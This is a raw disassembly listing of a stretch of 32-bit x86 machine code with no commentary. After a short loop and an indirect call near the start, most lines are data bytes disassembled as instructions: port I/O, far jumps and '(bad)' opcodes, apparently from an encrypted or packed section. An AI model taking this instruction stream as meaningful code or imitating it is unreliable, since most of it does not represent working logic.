  414e8e:	push   0x42a341
  414e93:	push   0x42a371
  414e98:	call   DWORD PTR ds:0x4251dc
  414e9e:	cmp    DWORD PTR ds:0x42a409,0x4
  414ea5:	jne    0x414eb8
  414eab:	mov    edx,DWORD PTR ds:0x42a409
  414eb1:	inc    edx
  414eb2:	mov    DWORD PTR ds:0x42a409,edx
  414eb8:	cmp    DWORD PTR ds:0x42a409,0x12
  414ebf:	jb     0x414e68
  414ec5:	or     eax,eax
  414ec7:	jmp    0x4153d9
  414ecc:	ror    ecx,1
  414ece:	cmp    al,0xcc
  414ed0:	aam    0xd9
  414ed2:	ror    ecx,1
  414ed4:	add    esp,esp
  414ed6:	sub    BYTE PTR [ecx],dh
  414ed8:	dec    ecx
  414ed9:	or     esi,DWORD PTR [ebx+0x7f2f9c6d]
  414edf:	js     0x414f54
  414ee1:	jl     0x414f5b
  414ee3:	js     0x414eb1
  414ee5:	sbb    esi,0x55fea5a0
  414eeb:	mov    ebp,0x5d3ed4fc
  414ef0:	mov    al,0x32
  414ef2:	add    dl,BYTE PTR [edx-0x2e]
  414ef5:	loopne 0x414f56
  414ef7:	rcr    BYTE PTR [esi+0x667a9cd1],1
  414efd:	pop    edx
  414efe:	aam    0x7e
  414f00:	fimul  DWORD PTR [ecx-0x5e71a6c5]
  414f06:	cwde   
  414f07:	test   DWORD PTR [edi+ebx*8-0x9cdd4dd],0x17d09793
  414f12:	sub    eax,0x3fe43bca
  414f17:	or     edx,edi
  414f19:	pushf  
  414f1a:	out    dx,eax
  414f1b:	repz or ecx,0x55
  414f1f:	mov    esi,0x1830a27d
  414f24:	aam    0xfb
  414f26:	push   ebx
  414f27:	aas    
  414f28:	iret   
  414f29:	inc    bx
  414f2b:	test   eax,0xd10c9150
  414f30:	dec    esp
  414f31:	mov    eax,ds:0xa8fc424c
  414f37:	mov    ebp,0x11961cc1
  414f3c:	cmc    
  414f3d:	jp     0x414f65
  414f3f:	sub    ebx,DWORD PTR [edx+0x642e1d58]
  414f45:	arpl   WORD PTR [eax-0x13],bx
  414f48:	std    
  414f49:	pop    es
  414f4a:	push   ss
  414f4b:	add    DWORD PTR [esi+0x15],ebx
  414f4e:	sbb    cl,BYTE PTR [ebx+0x4d4f89d6]
  414f54:	or     al,0xca
  414f56:	inc    esp
  414f57:	out    dx,al
  414f58:	lock outs dx,DWORD PTR ds:[esi]
  414f5a:	mov    dl,BYTE PTR [eax-0x65f8cfe5]
  414f60:	and    DWORD PTR [ebx+0x9],edx
  414f63:	add    al,0xa8
  414f65:	xor    dh,dh
  414f67:	dec    edi
  414f68:	fs mov al,0xb2
  414f6b:	fsub   QWORD PTR [esi-0x6c2b2648]
  414f71:	or     BYTE PTR [esi+0x71a64ffd],dh
  414f77:	cld    
  414f78:	lods   eax,DWORD PTR ds:[esi]
  414f79:	or     ah,BYTE PTR [edi+0x33]
  414f7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f7d:	rol    BYTE PTR [ebx],1
  414f7f:	cld    
  414f80:	cmp    al,0x74
  414f82:	aaa    
  414f83:	gs aas 
  414f85:	push   edi
  414f86:	mov    ds:0x26b7fa1,al
  414f8b:	sub    DWORD PTR [esi],0xbb6ac203
  414f91:	fcmove st,st(4)
  414f93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f94:	sbb    eax,0x46e4e8c0
  414f99:	stc    
  414f9a:	fwait
  414f9b:	xor    BYTE PTR [eax+eax*4+0x149863fe],bl
  414fa2:	imul   edi,DWORD PTR [eax-0x78f2f3f5],0xffffff8e
  414fa9:	push   ss
  414faa:	out    0xb7,eax
  414fac:	out    dx,al
  414fad:	into   
  414fae:	test   eax,0x66e8b17c
  414fb3:	xchg   BYTE PTR [edx],al
  414fb5:	loopne 0x414f5d
  414fb7:	pop    edx
  414fb8:	mov    eax,0x6ef2f4fb
  414fbd:	lods   al,BYTE PTR ds:[esi]
  414fbe:	cdq    
  414fbf:	jecxz  0x414fd7
  414fc1:	test   DWORD PTR [edx-0x34],edx
  414fc4:	jb     0x41501f
  414fc6:	push   ds
  414fc7:	push   es
  414fc8:	fstp   TBYTE PTR [edi-0x3b]
  414fcb:	cs cld 
  414fcd:	loop   0x414f78
  414fcf:	retf   0x9e33
  414fd2:	fbstp  TBYTE PTR [ecx+0x171a6bd5]
  414fd8:	xchg   edx,eax
  414fd9:	cli    
  414fda:	sbb    DWORD PTR [ebx],esi
  414fdc:	adc    eax,0x5325d453
  414fe1:	or     ah,dh
  414fe3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fe4:	adc    ebp,edx
  414fe6:	adc    eax,0x6d5ecafd
  414feb:	xchg   ebp,eax
  414fec:	jb     0x414fc3
  414fee:	xchg   edx,eax
  414fef:	sahf   
  414ff0:	out    0xfc,eax
  414ff2:	leave  
  414ff3:	div    DWORD PTR [ecx+0x58]
  414ff6:	test   eax,0x14a4d2b2
  414ffc:	das    
  414ffd:	cmp    edi,DWORD PTR [esi+0x7378ec6b]
  415003:	arpl   WORD PTR [eax+0x47350d3d],cx
  415009:	sub    dl,ch
  41500b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41500c:	ins    DWORD PTR es:[edi],dx
  41500d:	fdivrp st(0),st
  41500f:	mov    WORD PTR [ebx],ds
  415011:	movups XMMWORD PTR [edx],xmm6
  415014:	sbb    BYTE PTR [edi],0x9c
  415017:	push   ds
  415018:	mov    al,0x31
  41501a:	push   cs
  41501b:	daa    
  41501c:	dec    edx
  41501d:	out    dx,eax
  41501e:	mov    cl,0x8f
  415020:	xchg   ebp,eax
  415021:	gs mov edi,0x842e2285
  415027:	mov    eax,0x266839bc
  41502c:	test   al,0x42
  41502e:	lods   al,BYTE PTR ds:[esi]
  41502f:	cmp    edx,DWORD PTR [ecx+0x67455c70]
  415035:	shl    BYTE PTR [edi+0x67032fcd],cl
  41503b:	in     al,dx
  41503c:	fcom   QWORD PTR [ebx-0x826a22d]
  415042:	xor    esp,DWORD PTR [edx-0x1]
  415045:	adc    al,0x52
  415047:	push   cs
  415048:	pop    ss
  415049:	xor    al,0x1b
  41504b:	inc    esi
  41504c:	push   edx
  41504d:	adc    eax,0x26a498c1
  415052:	xor    edi,ecx
  415054:	push   es
  415055:	pop    esi
  415056:	sbb    BYTE PTR [esp+edx*8],0xa5
  41505a:	pop    esi
  41505b:	cmp    DWORD PTR [eax],edx
  41505d:	test   BYTE PTR [edi-0xd],dl
  415060:	cmp    eax,0xbc68d4f4
  415065:	jge    0x4150cb
  415067:	xchg   edx,eax
  415068:	and    DWORD PTR [edx+0x74],edi
  41506b:	enter  0x1e24,0x3f
  41506f:	mov    esi,0x2ba48b04
  415074:	iret   
  415075:	pop    ecx
  415076:	and    esi,eax
  415078:	mov    ecx,0xe69e3a52
  41507d:	xchg   esi,eax
  41507e:	sbb    eax,0x7b094dbf
  415083:	sub    al,0x20
  415085:	into   
  415086:	dec    ecx
  415087:	(bad)  
  415088:	pop    ss
  415089:	mov    ds:0xdb8b30cd,al
  41508e:	inc    edi
  41508f:	sahf   
  415090:	mov    ds:0xe8137a6f,eax
  415095:	dec    esi
  415096:	out    dx,al
  415097:	mov    es,WORD PTR [ecx-0x6f75525d]
  41509d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41509e:	pop    ds
  41509f:	or     al,0x3f
  4150a1:	adc    eax,0x1ffa4335
  4150a6:	pop    eax
  4150a7:	fsubr  DWORD PTR [esi-0x67]
  4150aa:	cli    
  4150ab:	sti    
  4150ac:	enter  0x1bb1,0x73
  4150b0:	rol    eax,1
  4150b2:	mov    esp,0xb41fcdf4
  4150b7:	cmp    DWORD PTR [eax],edi
  4150b9:	pop    DWORD PTR [edi]
  4150bb:	pop    esp
  4150bc:	adc    BYTE PTR [edx],dl
  4150be:	test   DWORD PTR [eax],esp
  4150c0:	es push ds
  4150c2:	and    eax,0xbd1e1c4d
  4150c7:	mov    WORD PTR [esi-0x3d337108],ss
  4150cd:	mov    esp,0x11c34629
  4150d2:	nop
  4150d3:	aaa    
  4150d4:	retf   
  4150d5:	or     al,0xd3
  4150d7:	outs   dx,BYTE PTR ds:[esi]
  4150d8:	push   ecx
  4150d9:	test   BYTE PTR [edi],ch
  4150db:	sbb    dh,al
  4150dd:	mov    eax,0x8195823
  4150e2:	sbb    DWORD PTR [ecx+0x2f],edi
  4150e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150e6:	sub    al,0x63
  4150e8:	xor    al,0xd1
  4150ea:	adc    al,0x57
  4150ec:	fnstenv [edi+0x55a8c16]
  4150f2:	or     al,0x7b
  4150f4:	js     0x4150bb
  4150f6:	fwait
  4150f7:	adc    ecx,ebx
  4150f9:	sahf   
  4150fa:	mov    bh,0xa5
  4150fc:	addr16 call 0x982864e0
  415102:	adc    ch,BYTE PTR [ecx-0x1f42ea89]
  415108:	scas   al,BYTE PTR es:[edi]
  415109:	mov    ah,0x1c
  41510b:	jo     0x415147
  41510d:	sub    ebp,eax
  41510f:	push   ecx
  415110:	sti    
  415111:	ror    ah,0x57
  415114:	pop    ebp
  415115:	jmp    0x4150cd
  415117:	pop    esp
  415118:	out    0x69,eax
  41511a:	and    ah,BYTE PTR [ecx-0x7141924c]
  415120:	test   BYTE PTR [ebx+0x2a7c7c4b],dl
  415126:	pushf  
  415127:	mov    esp,DWORD PTR [edx-0x766bbde1]
  41512d:	ds xchg esi,eax
  41512f:	pop    eax
  415130:	dec    esi
  415131:	mov    ds:0x48e3d3f7,al
  415136:	cmp    BYTE PTR [ebp-0x1d],ah
  415139:	sub    bl,BYTE PTR [ebx-0x6abe5351]
  41513f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415140:	cmp    edx,eax
  415142:	sub    eax,0xc430795f
  415147:	adc    ch,bl
  415149:	clc    
  41514a:	mov    ah,0xc2
  41514c:	xor    al,0xf2
  41514e:	out    0x1e,eax
  415150:	les    edx,FWORD PTR [edx+0x3a4af96a]
  415156:	std    
  415157:	(bad)  
  415158:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415159:	(bad)  
  41515a:	into   
  41515b:	jge    0x415199
  41515d:	mov    eax,ds:0xe76bd4c2
  415162:	pop    ecx
  415163:	ins    DWORD PTR es:[edi],dx
  415164:	rcl    DWORD PTR [ecx-0x42a66a63],0x7
  41516b:	in     eax,dx
  41516c:	jbe    0x4151c4
  41516e:	inc    ecx
  41516f:	pop    es
  415170:	push   ss
  415171:	jmp    0x41519a
  415173:	adc    cl,BYTE PTR [esi-0xcf810e5]
  415179:	adc    al,0x3e
  41517b:	clc    
  41517c:	inc    esp
  41517d:	inc    eax
  41517e:	mov    dl,0x50
  415180:	pop    ss
  415181:	pushf  
  415182:	(bad)  
  415183:	cmp    DWORD PTR [eax+0x669fc0c4],edi
  415189:	mov    esi,0x9ba8dd47
  41518e:	dec    ebx
  41518f:	xchg   esp,eax
  415190:	dec    eax
  415191:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415192:	mov    edi,0x5fbfc053
  415197:	pop    esi
  415198:	cmp    ch,BYTE PTR [ebx-0x29]
  41519b:	xor    BYTE PTR [ecx+0x2b8d5d0e],ah
  4151a1:	sbb    esp,DWORD PTR [esi-0x1bcbee5c]
  4151a7:	test   eax,0xc6356504
  4151ac:	push   ebx
  4151ad:	mov    ebx,0xcaa5e8a
  4151b2:	push   cs
  4151b3:	pop    esi
  4151b4:	dec    ebx
  4151b5:	jno    0x415153
  4151b7:	lea    eax,[esi+ebx*1]
  4151ba:	rol    DWORD PTR [eax+0x36],0x81
  4151be:	sub    DWORD PTR [ebx+0x17],0xfffffffc
  4151c2:	mov    ah,0xd2
  4151c4:	sub    cl,0xe2
  4151c7:	cwde   
  4151c8:	mov    esp,0x3faab3f0
  4151cd:	mov    ah,0x10
  4151cf:	jecxz  0x4151ef
  4151d1:	call   0xc92a:0xe5f5f98b
  4151d8:	fwait
  4151d9:	lds    eax,FWORD PTR [edx-0x1372ba41]
  4151df:	sbb    DWORD PTR [ebx],0xe949f610
  4151e5:	sbb    edi,DWORD PTR [esi]
  4151e7:	cmc    
  4151e8:	xchg   edx,eax
  4151e9:	xor    al,0x14
  4151eb:	popf   
  4151ec:	into   
  4151ed:	sub    eax,0xdf886818
  4151f2:	cdq    
  4151f3:	push   es
  4151f4:	cmp    eax,DWORD PTR [eax+0xe570bfe]
  4151fa:	outs   dx,BYTE PTR ds:[esi]
  4151fb:	out    dx,eax
  4151fc:	mov    esi,0xfec04263
  415201:	and    al,0xec
  415203:	mov    eax,ds:0xbe69bd2
  415208:	jns    0x4151da
  41520a:	and    BYTE PTR ds:[ecx-0x1d],bh
  41520e:	cmp    al,0x10
  415210:	lods   eax,DWORD PTR ds:[esi]
  415211:	sbb    eax,DWORD PTR [esi]
  415213:	jmp    0x9837afa4
  415218:	cld    
  415219:	aas    
  41521a:	aas    
  41521b:	fcmovu st,st(6)
  41521d:	sar    bh,cl
  41521f:	imul   ebp,ebx,0xffffffc9
  415222:	loop   0x4151c3
  415224:	cwde   
  415225:	lods   eax,DWORD PTR ds:[esi]
  415226:	stos   DWORD PTR es:[edi],eax
  415227:	popa   
  415228:	xor    eax,0x8ffed752
  41522d:	mov    gs,WORD PTR [ecx]
  41522f:	loope  0x4151c7
  415231:	mov    ah,0x39
  415233:	repnz shl DWORD PTR cs:[eax+0x5a],cl
  415238:	jb     0x415222
  41523a:	sbb    al,0xe0
  41523c:	and    eax,0x37cffcd1
  415241:	loopne 0x415286
  415243:	jmp    0x415247
  415245:	fsub   DWORD PTR [ecx]
  415247:	outs   dx,BYTE PTR ds:[esi]
  415248:	cmp    al,0x5a
  41524a:	sbb    ch,bl
  41524c:	mov    ebp,0x2d0ec83c
  415251:	mov    esi,0x8034e4bf
  415256:	push   cs
  415257:	cs sbb al,0x32
  41525a:	dec    eax
  41525b:	push   ecx
  41525c:	mov    BYTE PTR [ebx-0x17f26ef1],bl
  415262:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415263:	lods   eax,DWORD PTR ds:[esi]
  415264:	sti    
  415265:	int    0x38
  415267:	jno    0x41527b
  415269:	in     eax,0x6
  41526b:	aad    0x9d
  41526d:	cmp    DWORD PTR [eax-0x182591dd],edi
  415273:	xchg   esi,eax
  415274:	mov    ah,0x75
  415276:	je     0x415255
  415278:	popa   
  415279:	jns    0x415238
  41527b:	aad    0x94
  41527d:	in     al,dx
  41527e:	or     eax,0xb78730c8
  415283:	popa   
  415284:	mov    dl,0x18
  415286:	add    al,0x95
  415288:	xor    BYTE PTR [ebx],0x7d
  41528b:	pop    ebp
  41528c:	retf   
  41528d:	dec    ebp
  41528e:	ins    BYTE PTR es:[edi],dx
  41528f:	pop    esi
  415290:	dec    esi
  415291:	jmp    0x41527d
  415293:	int    0xc5
  415295:	xchg   DWORD PTR [ebx],esp
  415297:	mov    bl,0xb
  415299:	jge    0x4152c5
  41529b:	or     eax,0x2c90add9
  4152a0:	jae    0x4152ad
  4152a2:	mov    ds,WORD PTR [eax+0x3a]
  4152a5:	fidiv  WORD PTR [esi+ecx*8]
  4152a8:	add    al,0xdc
  4152aa:	mul    BYTE PTR [eax]
  4152ac:	mov    ah,0x35
  4152ae:	add    al,0x75
  4152b0:	pop    es
  4152b1:	and    BYTE PTR ds:0x94b8f527,dl
  4152b7:	dec    edx
  4152b8:	pop    ebx
  4152b9:	pop    edx
  4152ba:	xchg   esp,eax
  4152bb:	push   cs
  4152bc:	adc    ch,BYTE PTR [edi-0x7d]
  4152bf:	jmp    0x415288
  4152c1:	lahf   
  4152c2:	pop    eax
  4152c3:	hlt    
  4152c4:	fs aaa 
  4152c6:	aam    0x44
  4152c8:	mov    ah,0xc7
  4152ca:	dec    ebp
  4152cb:	or     esi,edx
  4152cd:	push   ecx
  4152ce:	popa   
  4152cf:	pop    ss
  4152d0:	jo     0x415279
  4152d2:	xor    DWORD PTR [edi+0x7d],ebp
  4152d5:	jb     0x4152fb
  4152d7:	stos   BYTE PTR es:[edi],al
  4152d8:	cli    
  4152d9:	inc    esp
  4152da:	push   ebp
  4152db:	and    edx,DWORD PTR [edx+0x720b61ef]
  4152e1:	mov    eax,0x2b85ca2e
  4152e6:	int    0x3e
  4152e8:	mov    edi,0x7e98742b
  4152ed:	push   es
  4152ee:	inc    ecx
  4152ef:	repnz (bad) 
  4152f1:	stc    
  4152f2:	or     DWORD PTR ds:0x63f341f4,esp
  4152f8:	es sub al,0x24
  4152fb:	out    dx,al
  4152fc:	ret    0x945f
  4152ff:	imul   ebp,ebx,0xffffffe8
  415302:	cdq    
  415303:	xchg   ecx,eax
  415304:	pop    esi
  415305:	adc    bh,BYTE PTR [esi-0x7f7ce464]
  41530b:	enter  0xf9ad,0xb9
  41530f:	xor    DWORD PTR [ebx+ebp*8-0x305fa63e],ebx
  415316:	inc    edx
  415317:	sub    eax,0x63909862
  41531c:	popw   ds
  41531e:	lahf   
  41531f:	xor    al,BYTE PTR [eax+0x73429383]
  415325:	mov    eax,0x9d2621fc
  41532a:	push   ss
  41532b:	add    edi,DWORD PTR [ecx]
  41532d:	push   ss
  41532e:	jns    0x4152cc
  415330:	or     edi,ebx
  415332:	pop    ebx
  415333:	cmp    BYTE PTR [ebp-0x3f],ah
  415336:	dec    edx
  415337:	retf   
  415338:	inc    cl
  41533a:	mov    DWORD PTR ds:0x65d23067,eax
  415340:	mov    al,0x81
  415342:	mov    ah,0x92
  415344:	jg     0x415347
  415346:	xor    DWORD PTR [edi+0x16],ebp
  415349:	xor    eax,0x6aab2863
  41534e:	xchg   esi,eax
  41534f:	arpl   cx,dx
  415351:	je     0x415384
  415353:	lds    edi,FWORD PTR [ebp-0x2a]
  415356:	jle    0x415326
  415358:	pushf  
  415359:	jge    0x415382
  41535b:	inc    ebp
  41535c:	dec    dh
  41535e:	mov    cl,0xd1
  415360:	aas    
  415361:	xchg   ebp,eax
  415362:	dec    eax
  415363:	push   ebx
  415364:	mov    bh,0x36
  415366:	mov    edi,0x5e86ef2
  41536b:	mov    BYTE PTR [ebp+0x1f],0xc4
  41536f:	mov    eax,edi
  415371:	xlat   BYTE PTR ds:[ebx]
  415372:	pop    esp
  415373:	mov    esi,0xb1433b44
  415378:	xor    bl,dh
  41537a:	mov    al,0xe8
  41537c:	mov    cl,0xd5
  41537e:	imul   edx,ebp,0xffffffe7
  415381:	adc    ebx,DWORD PTR ds:0x151659e0
  415387:	fbstp  TBYTE PTR [edx]
  415389:	popa   
  41538a:	pop    esi
  41538b:	scas   al,BYTE PTR es:[edi]
  41538c:	addr16 mov eax,0x324899e6
  415392:	int3   
  415393:	mov    al,ds:0x7b3108b8
  415398:	inc    eax
  415399:	int    0x32
  41539b:	pop    esp
  41539c:	lods   al,BYTE PTR ds:[esi]
  41539d:	xchg   ebp,eax
  41539e:	xchg   edi,eax
  41539f:	int3   
  4153a0:	out    0x9c,al
  4153a2:	neg    ch
  4153a4:	push   esp
  4153a5:	pushf  
  4153a6:	iret   
  4153a7:	pop    eax
  4153a8:	out    dx,eax
  4153a9:	repnz imul esp,DWORD PTR [edi+0x5e2012ca],0xffffffac
  4153b1:	(bad)  
  4153b2:	mov    eax,ds:0x2a72ef1a
  4153b7:	mov    dh,0x53
  4153b9:	or     edi,DWORD PTR [ebp+0xc]
  4153bc:	imul   ecx,DWORD PTR [eax+eax*4],0x33379f4f
  4153c3:	push   0x5b
  4153c5:	sbb    bh,0x0
  4153c8:	loop   0x4153c3
  4153ca:	sub    al,0xd7
  4153cc:	jno    0x41540f
  4153ce:	inc    dx
  4153d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153d1:	ret    0x2f13
  4153d4:	jle    0x415448
  4153d6:	jno    0x4153eb
  4153d8:	pop    eax
  4153d9:	push   edi
  4153da:	jmp    0x4158ec
  4153df:	ret    0xd7c7
  4153e2:	rcr    ecx,0xd1
  4153e5:	fcmovb st,st(7)
  4153e7:	jp     0x4153c9
  4153e9:	outs   dx,BYTE PTR ds:[esi]
  4153ea:	sub    edx,0xffffffbf
  4153ed:	sbb    ch,0x97
  4153f0:	xor    bh,BYTE PTR [edi+0x78]
  4153f3:	jae    0x415471
  4153f5:	js     0x41546f
  4153f7:	mov    esi,0x53e050da
  4153fc:	add    bh,dl
  4153fe:	scas   al,BYTE PTR es:[edi]
  4153ff:	push   edi
  415400:	xor    eax,0x130f6a64
  415405:	adc    dh,BYTE PTR [ecx-0x37]
  415408:	loop   0x415417
  41540a:	cmp    DWORD PTR [edx-0x6fc7f564],0x9f0acc82
  415414:	call   0x89d3:0x976c0bad
  41541b:	sbb    al,0x51
  41541d:	dec    ebp
  41541e:	in     eax,0xd8
  415420:	lods   eax,DWORD PTR ds:[esi]
  415421:	pop    esp
  415422:	xchg   ebx,eax
  415423:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  415425:	dec    ecx
  415426:	or     BYTE PTR [eax-0x951d306],bl
  41542c:	imul   DWORD PTR [edx-0x7122b2b5]
  415432:	mov    ch,bl
  415434:	fnstenv [ecx+eiz*1-0x5d]
  415438:	lods   eax,DWORD PTR ds:[esi]
  415439:	outs   dx,BYTE PTR ds:[esi]
  41543a:	mul    DWORD PTR [ebx-0x5f8fe62a]
  415440:	dec    edx
  415441:	cli    
  415442:	rol    dl,cl
  415444:	jle    0x415479
  415446:	mov    cl,0xc8
  415448:	iret   
  415449:	add    ch,BYTE PTR [esi+0x51d6fd00]
  41544f:	test   al,0x2f
  415451:	adc    al,0xee
  415453:	cwde   
  415454:	fucomp st(5)
  415456:	jae    0x41545f
  415458:	fwait
  415459:	cmovnp ebp,DWORD PTR [eax+0x12]
  41545d:	in     eax,0xa5
  41545f:	aam    0x27
  415461:	xchg   esi,eax
  415462:	adc    eax,0x4ebabef9
  415467:	(bad)  
  415468:	scas   eax,DWORD PTR es:[edi]
  415469:	outs   dx,DWORD PTR ds:[esi]
  41546a:	ins    BYTE PTR es:[edi],dx
  41546b:	ss jmp 0xf5ae495a
  415471:	pop    esp
  415472:	scas   al,BYTE PTR es:[edi]
  415473:	jmp    0x7f10:0x47a971f
  41547a:	fldlg2 
  41547c:	ret    0x920d
  41547f:	dec    edi
  415480:	pop    esp
  415481:	mov    cs,WORD PTR [ebx-0x2e537384]
  415487:	or     eax,0x4507a2db
  41548c:	pop    edi
  41548d:	das    
  41548e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41548f:	sbb    dl,BYTE PTR [ebp+0x79cd1f4f]
  415495:	pop    es
  415496:	push   edi
  415497:	(bad)  
  415498:	fs mov ah,0x79
  41549b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41549c:	lds    eax,FWORD PTR [ebx-0x2a0a9f9b]
  4154a2:	dec    esp
  4154a3:	push   cs
  4154a4:	lock sbb esp,DWORD PTR [edx+0x62]
  4154a8:	push   ss
  4154a9:	sub    al,0x28
  4154ab:	push   ebp
  4154ac:	mov    dh,0x51
  4154ae:	or     DWORD PTR [edi+0x9b223dc],0xffffffd0
  4154b5:	cs pop ss
  4154b7:	pusha  
  4154b8:	rcr    DWORD PTR [ecx-0x78],cl
  4154bb:	and    al,0xc
  4154bd:	leave  
  4154be:	and    DWORD PTR ds:0x246cb848,edx
  4154c4:	mov    ds:0x3fef0df0,al
  4154c9:	pushf  
  4154ca:	xchg   esi,ecx
  4154cc:	out    0x21,al
  4154ce:	out    0xf3,al
  4154d0:	mov    ebx,0x2a649d5f
  4154d5:	mov    al,0x9a
  4154d7:	int3   
  4154d8:	in     eax,dx
  4154d9:	jno    0x415461
  4154db:	or     eax,0x4be3e41a
  4154e0:	jmp    0x497f:0xa6cec905
  4154e7:	add    dh,dh
  4154e9:	pop    eax
  4154ea:	ja     0x415558
  4154ec:	out    dx,al
  4154ed:	div    BYTE PTR ds:0xa0330536
  4154f3:	inc    ebp
  4154f4:	jle    0x4154ee
  4154f6:	icebp  
  4154f7:	or     bl,BYTE PTR [eax]
  4154f9:	retf   0xb710
  4154fc:	ds pushf 
  4154fe:	sub    bh,BYTE PTR [ecx+0x4f]
  415501:	icebp  
  415502:	out    0x7e,al
  415504:	or     DWORD PTR [eax],eax
  415506:	out    0x44,al
  415508:	cmp    eax,0xe033ea60
  41550d:	push   esp
  41550e:	iret   
  41550f:	push   0xb8942206
  415514:	std    
  415515:	push   0xffffff8c
  415517:	shl    BYTE PTR [esi-0x73],0x97
  41551b:	pop    edx
  41551c:	adc    al,0xed
  41551e:	ss into 
  415520:	push   0xffffffa7
  415522:	sar    edx,1
  415524:	mov    esi,0x1130004d
  415529:	sub    DWORD PTR [edi-0x72d9cf27],ecx
  41552f:	clc    
  415530:	cwde   
  415531:	add    DWORD PTR [ebx-0x1479b501],esi
  415537:	and    ah,dh
  415539:	iret   
  41553a:	fwait
  41553b:	in     al,dx
  41553c:	push   eax
  41553d:	aaa    
  41553e:	or     BYTE PTR [esi-0x32],cl
  415541:	mov    al,ds:0xe28aa6b6
  415546:	jb     0x415551
  415548:	dec    ecx
  415549:	jecxz  0x41551e
  41554b:	shl    DWORD PTR [eax-0x6c],0x54
  41554f:	call   0xf5bbf85
  415554:	mov    dh,0xde
  415556:	aad    0xd2
  415558:	sub    dh,bh
  41555a:	stos   BYTE PTR es:[edi],al
  41555b:	jge    0x415530
  41555d:	and    al,0xd2
  41555f:	clc    
  415560:	test   BYTE PTR [edx+0x6970ed7b],al
  415566:	hlt    
  415567:	xchg   esp,eax
  415568:	into   
  415569:	dec    esi
  41556a:	sbb    esp,ecx
  41556c:	cwde   
  41556d:	scas   al,BYTE PTR es:[edi]
  41556e:	(bad)  
  41556f:	sbb    BYTE PTR [esp+eax*2+0x48],ch
  415573:	mov    WORD PTR [edi-0x24],gs
  415576:	push   ds
  415577:	xchg   esp,eax
  415578:	sub    al,0x35
  41557a:	push   ecx
  41557b:	add    ch,BYTE PTR [ebx-0x411548ab]
  415581:	push   esi
  415582:	inc    eax
  415583:	sbb    cl,BYTE PTR ds:0x6c1a7b36
  415589:	shr    BYTE PTR [eax-0xd23cb61],cl
  41558f:	sbb    al,0xcc
  415591:	daa    
  415592:	aam    0x7d
  415594:	push   ds
  415595:	es js  0x4155cc
  415598:	xlat   BYTE PTR ds:[ebx]
  415599:	add    BYTE PTR [ebp-0x14],al
  41559c:	call   0x46c6b4a8
  4155a1:	repz es cld 
  4155a4:	mov    ds:0x1d31f2e6,eax
  4155a9:	data16 xor BYTE PTR es:[eax-0x4f],ah
  4155ae:	and    ebx,DWORD PTR es:0xf8cbc4c
  4155b5:	push   edi
  4155b6:	xchg   cx,ax
  4155b8:	sub    DWORD PTR [ecx-0x62],0x8bdb6f30
  4155bf:	mov    ds:0x5c73ece1,al
  4155c4:	popa   
  4155c5:	or     esp,0x41cb86ef
  4155cb:	mov    ah,0x4a
  4155cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155ce:	fldenv [ecx+0x3d]
  4155d1:	or     bh,bh
  4155d3:	cmc    
  4155d4:	(bad)  
  4155d5:	mov    ebp,0x7446d182
  4155da:	xlat   BYTE PTR ds:[ebx]
  4155db:	jns    0x415605
  4155dd:	mov    bh,0xc1
  4155df:	into   
  4155e0:	jl     0x415567
  4155e2:	mov    ebx,0xe4ef5a57
  4155e7:	dec    ebx
  4155e8:	cdq    
  4155e9:	mov    bh,0x4a
  4155eb:	out    0xb8,eax
  4155ed:	(bad)  
  4155ee:	stc    
  4155ef:	les    ecx,FWORD PTR [eax-0x4ac400c1]
  4155f5:	xchg   esi,eax
  4155f6:	push   ecx
  4155f7:	push   ebp
  4155f8:	(bad)  
  4155f9:	scas   al,BYTE PTR es:[edi]
  4155fa:	mov    ch,0x3e
  4155fc:	sub    DWORD PTR [ebx-0x39],ecx
  4155ff:	and    ch,ah
  415601:	rol    DWORD PTR [edi+0x1c],0x3c
  415605:	idiv   BYTE PTR [esi-0x74]
  415608:	outs   dx,DWORD PTR ds:[esi]
  415609:	dec    ebp
  41560a:	xchg   ebx,eax
  41560b:	pop    es
  41560c:	sub    ch,BYTE PTR [ebx-0x18]
  41560f:	ret    0x5cb2
  415612:	ret    0x26c6
  415615:	xchg   esi,eax
  415616:	int3   
  415617:	mov    ebx,0xdf067149
  41561c:	sub    DWORD PTR [edi+0x3d23a55c],eax
  415622:	mov    al,ds:0x8eecc1ad
  415627:	cmp    dl,BYTE PTR [esp+edx*2+0x2e]
  41562b:	div    DWORD PTR [ebp-0x2fe3b269]
  415631:	mov    esi,0xe2c13d76
  415636:	sar    DWORD PTR [edx-0x33],1
  415639:	ja     0x415655
  41563b:	and    al,0x74
  41563d:	out    dx,eax
  41563e:	xlat   BYTE PTR ds:[ebx]
  41563f:	jnp    0x415699
  415641:	and    al,0xc4
  415643:	mov    dh,0x41
  415645:	jp     0x41564c
  415647:	or     al,dl
  415649:	pop    edx
  41564a:	ins    BYTE PTR es:[edi],dx
  41564b:	pop    esp
  41564c:	push   edx
  41564d:	adc    bl,BYTE PTR [ebx+0x6cab2054]
  415653:	aaa    
  415654:	pop    ecx
  415655:	es xor ebp,esp
  415658:	and    DWORD PTR [esi+0x40339395],esp
  41565e:	mov    ebp,0x81d1d62d
  415663:	push   cs
  415664:	out    0x61,al
  415666:	mov    ch,0x2d
  415668:	or     al,0xbe
  41566a:	addr16 pop es
  41566c:	(bad)  
  41566d:	cmc    
  41566e:	daa    
  41566f:	push   esp
  415670:	call   0x1e70:0x197b6b87
  415677:	jae    0x4156d2
  415679:	imul   ecx,DWORD PTR [edx+0x198a37f8],0x67
  415680:	loopne 0x415612
  415682:	in     eax,0x4a
  415684:	xor    eax,0xb07840c
  415689:	mov    cl,0x2e
  41568b:	mov    ch,0x13
